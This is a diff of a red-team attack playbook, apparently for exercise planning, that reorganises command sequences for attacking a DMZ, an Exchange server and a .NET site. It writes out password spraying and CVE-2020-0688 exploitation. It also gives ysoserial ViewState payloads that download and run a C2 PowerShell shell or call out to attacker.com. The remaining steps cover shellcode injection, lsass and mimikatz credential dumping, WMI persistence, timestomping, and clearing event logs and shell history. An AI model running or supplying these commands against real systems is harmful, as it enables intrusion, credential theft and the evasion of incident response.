@@ -3,11 +3,74 @@
 #### MSEL concepts:
 ###### DMZ
 ```txt
-# initial access
+# initial access firewall cve (out of scope?)
 python3 pfsense_auth_2.2.6_exec.py localhost:65535 nc <IP>
-proxychains hydra -L ~/users.txt -P ~/passwords.txt <IP> ssh -u -V;
-ssh <USER>@<IP>
 
+# initial access firewall (lockout feature) web-proxy, ftp, dns, and web-conf 
+proxychains hydra -L ~/users.txt -P ~/passwords.txt <IP> ssh -u -V;
+
+# shell to dmz boxes via ssh 
+ssh <USER>@<IP>
+```
+
+###### GREYZONE
+```txt
+# initial access via owa365/exchange, spray for access (or phish for NTLM hashes?)
+proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose
+
+# edit /tmp/command.txt
+CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))", 0, False
+
+# form based shells
+proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send
+
+# initial access via exchange, scan for recent cve
+proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
+
+# shell via oneliner
+proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"
+
+```
+
+###### EXTERNAL .NET SITE
+```txt
+# grab viewstate info
+curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &
+
+# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
+
+# test case: 2 – .net < 4.5 and enableviewstatemac=true & viewstateencryptionmode=false
+AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=<VIEWSTATEGENERATOR> --macdecode --legacy
+
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=<VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
+
+# test case: 3 – .net < 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true, remove __VIEWSTATEENCRYPTED
+curl -sv 'http://<URL>/Content/default.aspx' \  
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<VIEWSTATEBASE64>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1|egrep -i "validation of viewstate mac failed|may be encrypted"
+
+# test case: 4 – .net >= 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true/false except both attribute to false
+AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"
+
+ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
+
+# initial access
+curl -sv 'http://<URL>/Content/default.aspx' \  
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
+```
+
+###### ACTIONS ON LINUX PENETRATION
+```txt
 # on penetration, backup C2 and proxy
 nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
 nohup curl --insecure -sv https://<IP>/c2_python_proxy_server.py|python - & disown
@@ -62,20 +125,8 @@ for f in `find / -type f -name "*" 2>/dev/null`; do
 done;
 history -c && echo "" > ~/.bash_history
 ```
-
-###### GREYZONE
+###### ACTIONS ON WINDOWS PENETRATION
 ```txt
-# initial access
-proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose
-proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
-proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
-
-# edit /tmp/command.txt
-CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))", 0, False
-
-# reverse shell
-proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send
-
 # on penetration
 Survey 
 InstallWMIPersistence <EventFilterName> <EventConsumerName>
@@ -91,84 +142,7 @@ InstallPersistence 1
 InstallPersistence 2
 InstallPersistence 3
 GetProcess
-invoke_file /tmp/InjectShellcode.ps1
-msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
-Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
-
-# downgrade for DES hash, crack DES for NTLM
-invoke_file /tmp/Get-Hash.ps1
-Get-Hash
-
-# lsass mini-dump for NTLM or plaintext
-invoke_file /tmp/Out-Minidump.ps1
-Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
-TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
-download c:\temp\lsass_<PID>.dmp 
-SecureDelete c:\temp\lsass_<PID>.dmp 
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonPasswords full
-
-# lsa secrets for NTLM
-invoke_file /tmp/Invoke-PowerDump.ps1
-Invoke-PowerDump
-
-# clear logs
-foreach($log in (get-eventlog -list|foreach-object {$_.log})){
-	clear-eventlog -logname $_;
-}
-```
-
-###### EXTERNAL .NET SITE
-```txt
-# grab viewstate info
-curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &
-
-# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
-ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
-
-# test case: 2 – .net < 4.5 and enableviewstatemac=true & viewstateencryptionmode=false
-AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=<VIEWSTATEGENERATOR> --macdecode --legacy
-
-ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=<VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
-
-# test case: 3 – .net < 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true, remove __VIEWSTATEENCRYPTED
-curl -sv 'http://<URL>/Content/default.aspx' \  
-  -H 'Connection: keep-alive' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
-  -H 'Accept: */*' \
-  -H 'Accept-Language: en-US,en;q=0.9' \
-  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<VIEWSTATEBASE64>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1|egrep -i "validation of viewstate mac failed|may be encrypted"
-
-# test case: 4 – .net >= 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true/false except both attribute to false
-AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"
-
-ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
-
-# initial access
-curl -sv 'http://<URL>/Content/default.aspx' \  
-  -H 'Connection: keep-alive' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
-  -H 'Accept: */*' \
-  -H 'Accept-Language: en-US,en;q=0.9' \
-  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
-
-# on penetration
-Survey 
-InstallWMIPersistence <EventFilterName> <EventConsumerName>
-SetFallbackNetwork <PAddress> <subnetMask>
-invoke_file /tmp/socks_proxy_server.ps1
-iex(new-object net.webclient).downloadstring('<URL>socks_proxy_server.ps1')
-
-# edit proxychains.conf
-socks4 <IP> <PORT>
-
-# maintaining access from icmp c2, migrate to explorer etc..
-InstallPersistence 1
-InstallPersistence 2
-InstallPersistence 3
-GetProcess
+GetProcessFull
 invoke_file /tmp/InjectShellcode.ps1
 msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
 Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
@@ -192,9 +166,7 @@ invoke_file /tmp/Invoke-PowerDump.ps1
 Invoke-PowerDump
 
 # clear logs
-foreach($log in (get-eventlog -list|foreach-object {$_.log})){
-	clear-eventlog -logname $_;
-}
+foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -logname $_;}
 ```
 
 ###### LATERAL MOVEMENT
